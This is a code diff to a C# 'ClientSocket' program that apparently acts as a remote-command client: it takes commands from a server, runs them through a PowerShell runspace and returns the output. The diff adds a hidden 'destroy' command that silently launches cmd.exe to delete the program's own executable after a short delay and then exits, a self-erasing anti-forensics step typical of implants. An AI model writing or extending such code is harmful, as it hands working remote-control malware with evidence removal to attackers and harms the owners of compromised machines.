@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -9,6 +9,8 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Collections.ObjectModel;
 using System.IO;
+using static System.Net.Mime.MediaTypeNames;
+using System.Diagnostics;
 
 namespace ClientSocket
 {
@@ -39,6 +41,20 @@ namespace ClientSocket
                 return "Command not recognized";
             else
                 return result;
+        }
+
+        public void Destroy()
+        {
+            // Wait 3 seconds then delete the executable
+            Process.Start(new ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
+
+            Environment.Exit(1);
         }
         static void Main(string[] args)
         {
@@ -84,9 +100,17 @@ namespace ClientSocket
                 msg = Encoding.ASCII.GetString(buffer).TrimEnd('\0');
                 //Console.WriteLine("[+] Server says: {0}", msg);
 
-                result = program.GetResult(msg);
-
-                cs.Send(Encoding.ASCII.GetBytes(result));
+                if (msg == "destroy")
+                {
+                    program.Destroy();
+                    result = program.GetResult("ls");
+                    cs.Send(Encoding.ASCII.GetBytes(result));
+                }
+                else
+                {
+                    result = program.GetResult(msg);
+                    cs.Send(Encoding.ASCII.GetBytes(result));
+                }
             } while (msg != "quit");
 
 
